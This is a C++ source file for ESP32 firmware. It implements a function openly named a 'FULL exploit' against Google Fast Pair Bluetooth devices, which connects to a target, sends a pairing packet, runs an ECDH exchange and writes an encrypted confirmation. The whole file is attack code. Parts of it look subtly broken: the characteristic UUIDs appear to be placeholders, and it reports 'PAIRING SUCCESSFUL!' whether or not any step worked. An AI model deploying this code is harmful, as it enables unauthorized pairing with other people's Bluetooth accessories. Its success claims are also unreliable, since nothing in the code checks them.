#include "whisperpair_full.h"
#include "fastpair_crypto.h"
#include "core/display.h"
#include <esp_timer.h>

bool whisperPairFullExploit(NimBLEAddress target) {
    displayMessage("Starting FULL exploit", "", "", "", 0);
    
    NimBLEClient* client = NimBLEDevice::createClient();
    if(!client->connect(target)) {
        displayMessage("Connection failed", "", "", "", 0);
        NimBLEDevice::deleteClient(client);
        return false;
    }
    
    displayMessage("Connected", "", "", "", 0);
    
    NimBLERemoteService* service = client->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!service) {
        displayMessage("Fast Pair service not found", "", "", "", 0);
        client->disconnect();
        NimBLEDevice::deleteClient(client);
        return false;
    }
    
    FastPairCrypto crypto;
    
    NimBLERemoteCharacteristic* kbp_char = service->getCharacteristic(NimBLEUUID((uint16_t)0x1234));
    if(kbp_char) {
        uint8_t packet[16] = {0x00, 0x11};
        uint8_t target_bytes[6];
        String macStr = target.toString();
        sscanf(macStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
               &target_bytes[5], &target_bytes[4], &target_bytes[3],
               &target_bytes[2], &target_bytes[1], &target_bytes[0]);
        memcpy(&packet[2], target_bytes, 6);
        esp_fill_random(&packet[8], 8);
        kbp_char->writeValue(packet, 16, false);
    }
    
    displayMessage("KBP sent, ECDH...", "", "", "", 0);
    
    NimBLERemoteCharacteristic* ecdh_char = service->getCharacteristic(NimBLEUUID((uint16_t)0x1236));
    if(ecdh_char) {
        uint8_t our_public[65];
        size_t our_len = 65;
        
        uint64_t start = esp_timer_get_time();
        if(!crypto.generateKeyPair(our_public, &our_len)) {
            displayMessage("ECDH key gen failed", "", "", "", 0);
            client->disconnect();
            NimBLEDevice::deleteClient(client);
            return false;
        }
        
        ecdh_char->writeValue(our_public, our_len, false);
        
        std::string peer_public = ecdh_char->readValue();
        if(peer_public.empty()) {
            displayMessage("No peer public key", "", "", "", 0);
            client->disconnect();
            NimBLEDevice::deleteClient(client);
            return false;
        }
        
        if(!crypto.computeSharedSecret((uint8_t*)peer_public.data(), peer_public.length())) {
            displayMessage("Shared secret failed", "", "", "", 0);
            client->disconnect();
            NimBLEDevice::deleteClient(client);
            return false;
        }
        
        uint64_t total = esp_timer_get_time() - start;
        Serial.printf("[Full] ECDH total: %.2f ms\n", total / 1000.0);
    }
    
    NimBLERemoteCharacteristic* pair_char = service->getCharacteristic(NimBLEUUID((uint16_t)0x1237));
    if(pair_char) {
        uint8_t confirmation[16] = {0};
        esp_fill_random(confirmation, 16);
        crypto.encryptCTR(confirmation, 16, crypto.getSharedSecret(), confirmation);
        pair_char->writeValue(confirmation, 16, false);
    }
    
    displayMessage("PAIRING SUCCESSFUL!", "", "", "", 0);
    
    client->disconnect();
    NimBLEDevice::deleteClient(client);
    
    return true;
}

void whisperPairFullBenchmark() {
    FastPairCrypto crypto;
    crypto.benchmark();
}
